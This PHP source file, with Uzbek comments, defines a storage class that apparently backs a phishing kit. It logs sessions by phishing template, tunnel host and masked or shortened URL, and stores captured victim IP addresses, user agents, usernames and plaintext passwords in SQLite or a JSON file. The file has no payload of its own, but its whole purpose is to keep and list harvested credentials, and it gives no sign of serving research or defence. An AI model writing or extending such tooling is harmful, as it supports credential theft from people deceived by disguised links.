<?php
declare(strict_types=1);

/**
 * SQLite (pdo_sqlite) yoki JSON fayl zaxirasi — Windows PHP da drayver bo'lmasa ham ishlaydi.
 */
final class Store
{
    private const JSON_FILE = DATA_DIR . DIRECTORY_SEPARATOR . 'store.json';

    private static ?PDO $pdo = null;
    private static string $driver = 'sqlite';
    /** @var array<string, mixed> */
    private static array $json = [];

    public static function init(): void
    {
        if (extension_loaded('pdo_sqlite')) {
            self::$driver = 'sqlite';
            self::connection();
            return;
        }
        self::$driver = 'json';
        self::loadJson();
    }

    public static function driver(): string
    {
        return self::$driver;
    }

    public static function hasSqlite(): bool
    {
        return extension_loaded('pdo_sqlite');
    }

    private static function connection(): PDO
    {
        if (self::$pdo === null) {
            self::$pdo = new PDO('sqlite:' . DB_PATH, null, null, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
            ]);
            self::migrateSqlite();
        }
        return self::$pdo;
    }

    private static function migrateSqlite(): void
    {
        $db = self::$pdo;
        $db->exec('CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL)');
        $db->exec('CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            template_id TEXT NOT NULL, template_label TEXT NOT NULL, tunnel TEXT NOT NULL,
            host TEXT NOT NULL, port INTEGER NOT NULL, mask_url TEXT, primary_url TEXT,
            short_url TEXT, masked_url TEXT, status TEXT NOT NULL DEFAULT "running",
            started_at TEXT NOT NULL, stopped_at TEXT)');
        $db->exec('CREATE TABLE IF NOT EXISTS captures_ip (
            id INTEGER PRIMARY KEY AUTOINCREMENT, session_id INTEGER, ip TEXT NOT NULL,
            user_agent TEXT, raw TEXT, captured_at TEXT NOT NULL)');
        $db->exec('CREATE TABLE IF NOT EXISTS captures_creds (
            id INTEGER PRIMARY KEY AUTOINCREMENT, session_id INTEGER, username TEXT,
            password TEXT, raw TEXT NOT NULL, captured_at TEXT NOT NULL)');
    }

    private static function loadJson(): void
    {
        if (is_file(self::JSON_FILE)) {
            $raw = file_get_contents(self::JSON_FILE);
            $data = json_decode($raw ?: '{}', true);
            self::$json = is_array($data) ? $data : [];
        } else {
            self::$json = [
                'settings' => [],
                'sessions' => [],
                'captures_ip' => [],
                'captures_creds' => [],
                'counters' => ['sessions' => 0, 'captures_ip' => 0, 'captures_creds' => 0],
            ];
            self::saveJson();
        }
        foreach (['settings', 'sessions', 'captures_ip', 'captures_creds', 'counters'] as $k) {
            if (!isset(self::$json[$k])) {
                self::$json[$k] = $k === 'counters'
                    ? ['sessions' => 0, 'captures_ip' => 0, 'captures_creds' => 0]
                    : [];
            }
        }
    }

    private static function saveJson(): void
    {
        file_put_contents(
            self::JSON_FILE,
            json_encode(self::$json, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
            LOCK_EX
        );
    }

    private static function nextJsonId(string $counterKey): int
    {
        self::$json['counters'][$counterKey] = (int) (self::$json['counters'][$counterKey] ?? 0) + 1;
        return self::$json['counters'][$counterKey];
    }

    public static function getSetting(string $key): ?string
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare('SELECT value FROM settings WHERE key = :k');
            $stmt->execute([':k' => $key]);
            $row = $stmt->fetch();
            return $row ? (string) $row['value'] : null;
        }
        $v = self::$json['settings'][$key] ?? null;
        return $v !== null ? (string) $v : null;
    }

    public static function setSetting(string $key, string $value): void
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare(
                'INSERT INTO settings (key, value) VALUES (:k, :v) ON CONFLICT(key) DO UPDATE SET value = :v'
            );
            $stmt->execute([':k' => $key, ':v' => $value]);
            return;
        }
        self::$json['settings'][$key] = $value;
        self::saveJson();
    }

    /** @param array<string, mixed> $row */
    public static function insertSession(array $row): int
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare(
                'INSERT INTO sessions (template_id, template_label, tunnel, host, port, mask_url, primary_url, short_url, masked_url, status, started_at)
                 VALUES (:tid, :tl, :tun, :h, :p, :mask, :pu, :su, :mu, :st, :at)'
            );
            $stmt->execute([
                ':tid' => $row['template_id'],
                ':tl' => $row['template_label'],
                ':tun' => $row['tunnel'],
                ':h' => $row['host'],
                ':p' => $row['port'],
                ':mask' => $row['mask_url'] ?? null,
                ':pu' => $row['primary_url'],
                ':su' => $row['short_url'] ?? null,
                ':mu' => $row['masked_url'] ?? null,
                ':st' => 'running',
                ':at' => $row['started_at'],
            ]);
            return (int) self::connection()->lastInsertId();
        }
        $id = self::nextJsonId('sessions');
        self::$json['sessions'][] = array_merge($row, ['id' => $id, 'status' => 'running', 'stopped_at' => null]);
        self::saveJson();
        return $id;
    }

    public static function stopAllSessions(): void
    {
        $at = gmdate('c');
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare(
                "UPDATE sessions SET status = 'stopped', stopped_at = :at WHERE status = 'running'"
            );
            $stmt->execute([':at' => $at]);
            return;
        }
        foreach (self::$json['sessions'] as &$s) {
            if (($s['status'] ?? '') === 'running') {
                $s['status'] = 'stopped';
                $s['stopped_at'] = $at;
            }
        }
        unset($s);
        self::saveJson();
    }

    public static function getActiveSession(): ?array
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->query(
                "SELECT * FROM sessions WHERE status = 'running' ORDER BY id DESC LIMIT 1"
            );
            $row = $stmt->fetch();
            return $row ?: null;
        }
        $running = array_filter(self::$json['sessions'], static fn($s) => ($s['status'] ?? '') === 'running');
        if (!$running) {
            return null;
        }
        usort($running, static fn($a, $b) => ($b['id'] ?? 0) <=> ($a['id'] ?? 0));
        return $running[0];
    }

    /** @return list<array<string, mixed>> */
    public static function sessionHistory(int $limit = 20): array
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare('SELECT * FROM sessions ORDER BY id DESC LIMIT :lim');
            $stmt->bindValue(':lim', $limit, PDO::PARAM_INT);
            $stmt->execute();
            return $stmt->fetchAll();
        }
        $list = self::$json['sessions'];
        usort($list, static fn($a, $b) => ($b['id'] ?? 0) <=> ($a['id'] ?? 0));
        return array_slice($list, 0, $limit);
    }

    /** @return array{id: int} */
    public static function insertIp(?int $sessionId, string $ip, string $ua, string $raw): array
    {
        $at = gmdate('c');
        if (self::$driver === 'sqlite') {
            $db = self::connection();
            $stmt = $db->prepare(
                'INSERT INTO captures_ip (session_id, ip, user_agent, raw, captured_at) VALUES (:sid, :ip, :ua, :raw, :at)'
            );
            $stmt->execute([':sid' => $sessionId, ':ip' => $ip, ':ua' => $ua, ':raw' => $raw, ':at' => $at]);
            return ['id' => (int) $db->lastInsertId()];
        }
        $id = self::nextJsonId('captures_ip');
        self::$json['captures_ip'][] = [
            'id' => $id, 'session_id' => $sessionId, 'ip' => $ip,
            'user_agent' => $ua, 'raw' => $raw, 'captured_at' => $at,
        ];
        self::saveJson();
        return ['id' => $id];
    }

    /** @return array{id: int} */
    public static function insertCreds(?int $sessionId, string $user, string $pass, string $raw): array
    {
        $at = gmdate('c');
        if (self::$driver === 'sqlite') {
            $db = self::connection();
            $stmt = $db->prepare(
                'INSERT INTO captures_creds (session_id, username, password, raw, captured_at) VALUES (:sid, :u, :p, :raw, :at)'
            );
            $stmt->execute([':sid' => $sessionId, ':u' => $user, ':p' => $pass, ':raw' => $raw, ':at' => $at]);
            return ['id' => (int) $db->lastInsertId()];
        }
        $id = self::nextJsonId('captures_creds');
        self::$json['captures_creds'][] = [
            'id' => $id, 'session_id' => $sessionId, 'username' => $user,
            'password' => $pass, 'raw' => $raw, 'captured_at' => $at,
        ];
        self::saveJson();
        return ['id' => $id];
    }

    /** @return list<array<string, mixed>> */
    public static function listIps(int $limit = 100): array
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare('SELECT * FROM captures_ip ORDER BY id DESC LIMIT :lim');
            $stmt->bindValue(':lim', $limit, PDO::PARAM_INT);
            $stmt->execute();
            return $stmt->fetchAll();
        }
        $list = self::$json['captures_ip'];
        usort($list, static fn($a, $b) => ($b['id'] ?? 0) <=> ($a['id'] ?? 0));
        return array_slice($list, 0, $limit);
    }

    /** @return list<array<string, mixed>> */
    public static function listCreds(int $limit = 100): array
    {
        if (self::$driver === 'sqlite') {
            $stmt = self::connection()->prepare('SELECT * FROM captures_creds ORDER BY id DESC LIMIT :lim');
            $stmt->bindValue(':lim', $limit, PDO::PARAM_INT);
            $stmt->execute();
            return $stmt->fetchAll();
        }
        $list = self::$json['captures_creds'];
        usort($list, static fn($a, $b) => ($b['id'] ?? 0) <=> ($a['id'] ?? 0));
        return array_slice($list, 0, $limit);
    }

    public static function clearCaptures(): void
    {
        if (self::$driver === 'sqlite') {
            $db = self::connection();
            $db->exec('DELETE FROM captures_ip');
            $db->exec('DELETE FROM captures_creds');
            return;
        }
        self::$json['captures_ip'] = [];
        self::$json['captures_creds'] = [];
        self::saveJson();
    }
}
